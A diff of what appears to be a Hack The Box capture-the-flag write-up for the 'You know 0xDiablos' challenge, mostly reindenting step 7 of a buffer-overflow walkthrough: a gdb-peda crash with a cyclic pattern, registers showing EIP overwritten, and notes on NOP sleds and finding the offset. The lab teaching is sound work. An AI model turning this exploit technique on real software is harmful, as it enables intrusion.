@@ -180,50 +180,50 @@ GCC: (Debian 8.3.0-19) 8.3.0
 
 7. Run (`r`) the program with `bof.txt` as input:
 
-	```shell
+  ```shell
   # run program using box.txt as input
-	gdb-peda$ r < bof.txt
-	Starting program: /home/kali/htb/you_know_0xdiablos/vuln < bof.txt
-	[Thread debugging using libthread_db enabled]
-	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-	You know who are 0xDiablos:
-	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
-	
-	Program received signal SIGSEGV, Segmentation fault.
-	[----------------------------------registers-----------------------------------]
-	EAX: 0xc9
-	EBX: 0x76414158 ('XAAv')
-	ECX: 0xf7f969b8 --> 0x0
-	EDX: 0x0
-	ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
-	EDI: 0xf7ffcba0 --> 0x0
-	EBP: 0x41594141 ('AAYA')
-	ESP: 0xffffcd90 ("ZAAxAAyA")
-	EIP: 0x41417741 ('AwAA')
-	EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
-	[-------------------------------------code-------------------------------------]
-	Invalid $PC address: 0x41417741
-	[------------------------------------stack-------------------------------------]
-	0000| 0xffffcd90 ("ZAAxAAyA")
-	0004| 0xffffcd94 ("AAyA")
-	0008| 0xffffcd98 --> 0xf7d93900 --> 0x78656d ('mex')
-	0012| 0xffffcd9c --> 0x3e8
-	0016| 0xffffcda0 --> 0xffffcdc0 --> 0x1
-	0020| 0xffffcda4 --> 0xf7f94ff4 --> 0x21dd8c
-	0024| 0xffffcda8 --> 0x0
-	0028| 0xffffcdac --> 0xf7d9a7c5 (add    esp,0x10)
-	[------------------------------------------------------------------------------]
-	Legend: code, data, rodata, value
-	Stopped reason: SIGSEGV
-	0x41417741 in ?? ()
-	```
+  gdb-peda$ r < bof.txt
+  Starting program: /home/kali/htb/you_know_0xdiablos/vuln < bof.txt
+  [Thread debugging using libthread_db enabled]
+  Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+  You know who are 0xDiablos:
+  AAA%AAsAABAA$AAnAACAA-AA(AADAA\;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+  Program received signal SIGSEGV, Segmentation fault.
+  [----------------------------------registers-----------------------------------]
+  EAX: 0xc9
+  EBX: 0x76414158 ('XAAv')
+  ECX: 0xf7f969b8 --> 0x0
+  EDX: 0x0
+  ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
+  EDI: 0xf7ffcba0 --> 0x0
+  EBP: 0x41594141 ('AAYA')
+  ESP: 0xffffcd90 ("ZAAxAAyA")
+  EIP: 0x41417741 ('AwAA')
+  EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0x41417741
+  [------------------------------------stack-------------------------------------]
+  0000| 0xffffcd90 ("ZAAxAAyA")
+  0004| 0xffffcd94 ("AAyA")
+  0008| 0xffffcd98 --> 0xf7d93900 --> 0x78656d ('mex')
+  0012| 0xffffcd9c --> 0x3e8
+  0016| 0xffffcda0 --> 0xffffcdc0 --> 0x1
+  0020| 0xffffcda4 --> 0xf7f94ff4 --> 0x21dd8c
+  0024| 0xffffcda8 --> 0x0
+  0028| 0xffffcdac --> 0xf7d9a7c5 (add    esp,0x10)
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x41417741 in ?? ()
+  ```
 
   > A standard buffer overflow is **used to overwrite the Extended Instruction Pointer (EIP)**. It is usually possible to predict an appropriate EIP value that will land execution within the NOPs (No Operation) which will “execute” until the payload (usually shellcode) is encountered.
 
-  ```EIP-value
-  # we have successfully overflowed the IP
-  EIP: 0x41417741 ('AwAA')
-  ```
+    ```EIP-value
+    # we have successfully overflowed the IP
+    EIP: 0x41417741 ('AwAA')
+    ```
 
 8. We need to find the offset, which will enable us to find the exact location after which we can inject our payload:
 
